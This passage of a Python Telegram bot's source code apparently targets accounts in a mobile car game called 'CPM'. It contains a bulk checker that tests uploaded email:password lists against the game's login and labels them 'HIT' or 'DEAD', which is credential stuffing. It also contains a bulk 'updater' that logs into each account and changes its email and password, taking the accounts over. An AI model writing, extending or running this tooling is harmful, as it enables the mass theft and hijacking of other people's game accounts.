                                              reply_markup=admin_kb(), parse_mode=ParseMode.HTML)
                return ConversationHandler.END
            file_content = f"{BRAND_NAME} - FULL USER DATABASE\n" + "=" * 50 + "\n\n"
            for u in all_users:
                uid = u.get("_id", "N/A")
                username = u.get("username", "No Username")
                name = u.get("first_name", "No Name")
                role = u.get("role", "user").upper()
                status = u.get("status", "pending").upper()
                joined = u.get("joined", "").split("T")[0] if u.get("joined") else "Unknown"
                file_content += f"ID: {uid} | @{username} ({name}) | Role: {role} | Status: {status} | Joined: {joined}\n"

            filename = f"Users_DB_{datetime.now().strftime('%H%M%S')}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(file_content)
            await context.bot.send_document(chat_id=user_id, document=open(filename, "rb"),
                caption=f"👥 <b>USER DATABASE EXPORTED</b>",
                parse_mode=ParseMode.HTML)
            os.remove(filename)
            await query.edit_message_text("USER DATABASE EXTRACTED SUCCESSFULLY",
                                          parse_mode=ParseMode.HTML, reply_markup=admin_kb())
            return ConversationHandler.END

        elif action == "adm_broadcast":
            await query.edit_message_text(
                f"📢 <b>GLOBAL BROADCAST</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Transmit your message payload below:",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb()
            )
            return AWAIT_BROADCAST

        elif action == "adm_block":
            await query.edit_message_text(
                f"🚫 <b>RESTRICT ACCESS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Provide User ID to block:",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb()
            )
            return AWAIT_BLOCK_ID

        elif action == "adm_unblock":
            await query.edit_message_text(
                f"✅ <b>RESTORE ACCESS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Provide User ID to unblock:",
                parse_mode=ParseMode.HTML, reply_markup=cancel_kb()
            )
            return AWAIT_UNBLOCK_ID

        return ConversationHandler.END

    return ConversationHandler.END

# ==================== BACKGROUND WORKERS ====================
async def background_updater(chat_id, lines, game_ver, email_rule, pass_rule, bot, msg_id, user_id):
    results = []
    success_count = 0
    for line in lines:
        try:
            parts = line.split(':')
            if len(parts) < 2:
                continue
            old_e, old_p = parts[0].strip(), parts[1].strip()
            login_res = await cpm_login(game_ver, old_e, old_p)
            if not login_res.get("ok"):
                results.append(f"❌ {old_e} : LOGIN ERR")
                continue
            token = login_res["data"]["idToken"]
            final_email, final_pass = old_e, old_p

            if email_rule == 'RANDOM':
                target_e = generate_random_email()
                email_res = await cpm_change_email(game_ver, token, target_e)
                if email_res.get("ok"):
                    token = email_res["data"]["idToken"]
                    final_email = target_e
                else:
                    results.append(f"❌ {old_e} : EMAIL ERR")
                    continue

            if pass_rule != 'SKIP':
                pass_res = await cpm_change_password(game_ver, token, pass_rule)
                if pass_res.get("ok"):
                    final_pass = pass_rule
                else:
                    results.append(f"❌ {final_email} : PASS ERR")
                    continue

            results.append(f"✅ {final_email}:{final_pass}")
            success_count += 1
        except Exception:
            pass
        await asyncio.sleep(1.5)

    log_action(user_id, "bulk_update",
               f"Game: {game_ver} | Success: {success_count} | Total: {len(lines)} | Email Rule: {email_rule} | Pass Rule: {pass_rule}")

    output = f"Bulk_Update_{game_ver.upper()}_{datetime.now().strftime('%H%M%S')}.txt"
    with open(output, "w", encoding="utf-8") as f:
        f.write("\n".join(results))
    await bot.send_document(chat_id=chat_id, document=open(output, "rb"),
        caption=f"📦 <b>UPDATER COMPLETE ({game_ver.upper()})</b>",
        parse_mode=ParseMode.HTML)
    try:
        await bot.delete_message(chat_id=chat_id, message_id=msg_id)
    except Exception:
        pass
    os.remove(output)

async def background_validator(chat_id, lines, game_ver, bot, msg_id, user_id):
    results = []
    hits, deads = 0, 0
    for line in lines:
        try:
            parts = line.split(':')
            if len(parts) != 2:
                continue
            email, pwd = [p.strip() for p in parts]
            login_res = await cpm_login(game_ver, email, pwd)
            if login_res.get("ok"):
                results.append(f"✅ HIT : {email}:{pwd}")
                hits += 1
            else:
                results.append(f"❌ DEAD : {email}:{pwd}")
                deads += 1
        except Exception:
            pass
        await asyncio.sleep(1.2)

    log_action(user_id, "bulk_validate",
               f"Game: {game_ver} | Hits: {hits} | Dead: {deads} | Total: {len(lines)}")

    output = f"Validator_Result_{game_ver.upper()}_{datetime.now().strftime('%H%M%S')}.txt"
    with open(output, "w", encoding="utf-8") as f:
        f.write("\n".join(results))
    await bot.send_document(chat_id=chat_id, document=open(output, "rb"),
        caption=(f"🔍 <b>VALIDATION COMPLETE ({game_ver.upper()})</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ <b>Hits:</b> {hits}\n"
                 f"❌ <b>Dead:</b> {deads}"),
        parse_mode=ParseMode.HTML)
    try:
        await bot.delete_message(chat_id=chat_id, message_id=msg_id)
    except Exception:
        pass
    os.remove(output)

# ==================== BULK DATA ROUTERS ====================
async def receive_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lines = []
    if update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        lines = [line for line in file_content.decode('utf-8').split('\n') if line.strip()]
    else:
        lines = [line for line in update.message.text.strip().split('\n') if line.strip()]

    if not lines:
        await update.message.reply_text(
            f"❌ Could not extract any valid Email:Password combinations.",
            parse_mode=ParseMode.HTML, reply_markup=back_kb()
        )
        return ConversationHandler.END

    context.user_data["bulk_lines"] = lines
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🎲 Set Random Emails", callback_data="bulk_em_random")],
        [InlineKeyboardButton(text="⏭️ Skip (Don't Change)", callback_data="bulk_em_skip")],
        [InlineKeyboardButton(text="❌ Abort Operation", callback_data="menu")]
    ])
    text = (
        f"✅ Loaded <b>{len(lines)}</b> accounts.\n\n"
        f"🛠️ <b>Step 2: Target Email</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"What should be the new email for all these accounts?"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
    return AWAIT_BULK_NEW_EMAIL

async def bulk_email_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if query.data == "menu":
        return await menu_callback(update, context)

    choice = "RANDOM" if query.data == "bulk_em_random" else "SKIP"
    context.user_data["bulk_new_email"] = choice

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="⏭️ Skip (Don't Change)", callback_data="bulk_pw_skip")],
        [InlineKeyboardButton(text="❌ Abort Operation", callback_data="menu")]
    ])
    text = (
        f"🛠️ <b>Step 3: Target Password</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Type the new password for ALL accounts in the chat below, or click SKIP."
    )
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
    return AWAIT_BULK_NEW_PASS

async def bulk_pass_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    new_pass = "SKIP"

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        if query.data == "menu":
            return await menu_callback(update, context)
        msg_id = query.message.message_id
        await query.edit_message_text(
            f"⏳ <i>Initializing background updater...</i>",
            parse_mode=ParseMode.HTML
        )
    else:
        new_pass = update.message.text.strip()
        msg = await update.message.reply_text(
            f"⏳ <i>Initializing background updater...</i>",
            parse_mode=ParseMode.HTML
        )
        msg_id = msg.message_id

    game_ver = context.user_data.get("game_version", "cpm2")
    lines = context.user_data.get("bulk_lines", [])
    new_em_choice = context.user_data.get("bulk_new_email", "SKIP")

    asyncio.create_task(background_updater(chat_id, lines, game_ver, new_em_choice, new_pass,
                                            context.bot, msg_id, user_id))
    return ConversationHandler.END

async def process_validator_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    game_ver = context.user_data.get("game_version", "cpm2")
    lines = []
    if update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        lines = [line for line in file_content.decode('utf-8').split('\n') if line.strip()]
    else:
        lines = [line for line in update.message.text.strip().split('\n') if line.strip()]

    msg = await update.message.reply_text(
        f"⏳ <i>Validating {len(lines)} accounts in background ({game_ver.upper()})...</i>",
        parse_mode=ParseMode.HTML
    )
    asyncio.create_task(background_validator(update.effective_chat.id, lines, game_ver,
                                              context.bot, msg.message_id, user_id))
    return ConversationHandler.END

# ==================== ACCOUNT OPERATIONS ====================
async def login_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data["email"] = update.message.text.strip().lower()
    game = context.user_data.get("game_version", "cpm2").upper()
    await update.message.reply_text(
        f"🔐 <b>LOGIN PORTAL ({game})</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Target Email:</b> <code>{context.user_data['email']}</code>\n\n"
        f"🔒 Provide your security password:",
        parse_mode=ParseMode.HTML, reply_markup=cancel_kb()
    )
    return AWAIT_PASSWORD_LOGIN

async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    email = context.user_data.get("email")
    game_ver = context.user_data.get("game_version", "cpm2")
    try:
        await update.message.delete()
    except Exception:
        pass

    msg = await update.message.reply_text(
        f"⏳ <i>Authenticating credentials...</i>",
        parse_mode=ParseMode.HTML
    )
    result = await cpm_login(game_ver, email, password)
    if result.get("ok"):
        sessions[user_id] = {
            "idToken": result["data"]["idToken"],
            "email": result["data"]["email"],
            "uid": result["data"].get("localId", "?"),
            "game": game_ver
        }
        log_action(user_id, "login", f"Game: {game_ver} | Email: {email}")
        await msg.edit_text(
            f"✅ <b>AUTHENTICATION SUCCESSFUL ({game_ver.upper()})</b>",
            parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb()
        )
    else:
        await msg.edit_text(
            f"Authentication failed:\n{result.get('error')}",
            parse_mode=ParseMode.HTML, reply_markup=back_kb()
        )
    return ConversationHandler.END

async def new_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    new_em = update.message.text.strip()
    session = sessions.get(user_id)
    if not session:
        return ConversationHandler.END

    if new_em.upper() == 'RANDOM':
        new_em = generate_random_email()

    msg = await update.message.reply_text(
        f"⏳ <i>Syncing changes...</i>",
        parse_mode=ParseMode.HTML
    )
    result = await cpm_change_email(session["game"], session["idToken"], new_em)
    if result.get("ok"):
        session["idToken"] = result["data"]["idToken"]
        session["email"] = result["data"].get("email", new_em)
        log_action(user_id, "change_email", f"Game: {session['game']} | New Email: {new_em}")
        await msg.edit_text(
            f"📧 CREDENTIALS UPDATED\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Email modified to:\n<blockquote><code>{new_em}</code></blockquote>",
            parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb()
        )
    else:
        await msg.edit_text(result.get("error", "Error"), parse_mode=ParseMode.HTML, reply_markup=back_kb())
    return ConversationHandler.END

async def new_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    pwd = update.message.text.strip()
    try:
        await update.message.delete()
    except Exception:
        pass
    context.user_data["new_password"] = pwd
    await update.message.reply_text(
        f"🔒 CONFIRM SECURITY CHANGE\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Please re-enter the new password to confirm:",
        parse_mode=ParseMode.HTML, reply_markup=cancel_kb()
    )
    return AWAIT_CONFIRM_PASSWORD

async def confirm_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    confirm = update.message.text.strip()
    new_pwd = context.user_data.get("new_password")
    try:
        await update.message.delete()
    except Exception:
        pass

    if confirm != new_pwd:
        await update.message.reply_text(
            "Mismatch Error: Passwords do not align.",
            parse_mode=ParseMode.HTML, reply_markup=back_kb()
        )
        return ConversationHandler.END

    session = sessions.get(user_id)
    if not session:
        return ConversationHandler.END

    msg = await update.message.reply_text(
        f"⏳ <i>Deploying...</i>",
        parse_mode=ParseMode.HTML
    )
    result = await cpm_change_password(session["game"], session["idToken"], new_pwd)
    if result.get("ok"):
        session["idToken"] = result["data"]["idToken"]
        log_action(user_id, "change_password", f"Game: {session['game']} | Email: {session['email']}")
        await msg.edit_text(
            f"🔒 SECURITY UPDATED\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Password modified successfully.",
            parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb()
        )
    else:
        await msg.edit_text(result.get("error", "Error"), parse_mode=ParseMode.HTML, reply_markup=back_kb())
    return ConversationHandler.END

async def do_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return ConversationHandler.END

    msg = await update.message.reply_text(
        f"⏳ <i>Transmitting...</i>",
        parse_mode=ParseMode.HTML
    )
    sent, failed = 0, 0
    for u in get_all_users():
        try:
            await context.bot.send_message(
                int(u["_id"]),
                f"📢 <b>SYSTEM BROADCAST</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n{update.message.text}",
                parse_mode=ParseMode.HTML
            )
            sent += 1
        except Exception:
            failed += 1

    await msg.edit_text(
        f"✅ <b>TRANSMISSION COMPLETE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📬 <b>Delivered:</b> {sent}\n"
        f"❌ <b>Failed:</b> {failed}",
        parse_mode=ParseMode.HTML, reply_markup=admin_kb()
    )
    return ConversationHandler.END

async def do_block(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return ConversationHandler.END
    try:
        block_user(int(update.message.text.strip()))
        await update.message.reply_text(
            f"🚫 <b>Target Blacklisted Successfully.</b>",
            parse_mode=ParseMode.HTML, reply_markup=admin_kb()
        )
    except Exception:
        await update.message.reply_text(
            f"❌ Invalid ID format.",
            parse_mode=ParseMode.HTML, reply_markup=admin_kb()
        )
    return ConversationHandler.END

async def do_unblock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return ConversationHandler.END
    try:
        unblock_user(int(update.message.text.strip()))
        await update.message.reply_text(
            f"✅ <b>Target Access Restored.</b>",
            parse_mode=ParseMode.HTML, reply_markup=admin_kb()
        )
    except Exception:
        await update.message.reply_text(
            f"❌ Invalid ID format.",
            parse_mode=ParseMode.HTML, reply_markup=admin_kb()
        )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"❌ <i>Operation aborted.</i>",
        parse_mode=ParseMode.HTML, reply_markup=back_kb()
    )
    return ConversationHandler.END

# ==================== ACTIVE SESSIONS ====================
sessions = {}

# ==================== MAIN ====================
def main():
    keep_alive()
    app = Application.builder().token(BOT_TOKEN).post_init(setup_commands).build()

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CommandHandler("admin", admin_cmd),
            CommandHandler("profile", profile_cmd),
            CommandHandler("lock", lock_bot),
            CommandHandler("unlock", unlock_bot),
            CommandHandler("revoke", revoke_cmd),
            CommandHandler("find", find_cmd),
            CommandHandler("addadmin", addadmin_cmd),
            CommandHandler("remadmin", remadmin_cmd),
            CommandHandler("logs", logs_cmd),
            CommandHandler("format", format_cmd),
            CallbackQueryHandler(menu_callback)
        ],
        states={
            AWAIT_EMAIL_LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_email)],
            AWAIT_PASSWORD_LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password)],
            AWAIT_NEW_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, new_email)],
            AWAIT_NEW_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, new_password)],
            AWAIT_CONFIRM_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_password)],
            AWAIT_BROADCAST: [MessageHandler(filters.TEXT & ~filters.COMMAND, do_broadcast)],
            AWAIT_BLOCK_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, do_block)],
            AWAIT_UNBLOCK_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, do_unblock)],
            AWAIT_BULK_FILE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_bulk_file),
                MessageHandler(filters.Document.MimeType("text/plain"), receive_bulk_file)
            ],
            AWAIT_BULK_NEW_EMAIL: [CallbackQueryHandler(bulk_email_choice)],
            AWAIT_BULK_NEW_PASS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, bulk_pass_choice),
                CallbackQueryHandler(bulk_pass_choice)
            ],
            AWAIT_VALIDATOR_DATA: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, process_validator_data),
                MessageHandler(filters.Document.MimeType("text/plain"), process_validator_data)
            ]
        },
        fallbacks=[
            CommandHandler("start", start),
            CommandHandler("cancel", cancel),
            CallbackQueryHandler(menu_callback)
        ],
        per_message=False,
    )
    app.add_handler(conv)
    logger.info(f"{BRAND_NAME} Bot Online (English Only + JSON Storage + Auto VIP Request)")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
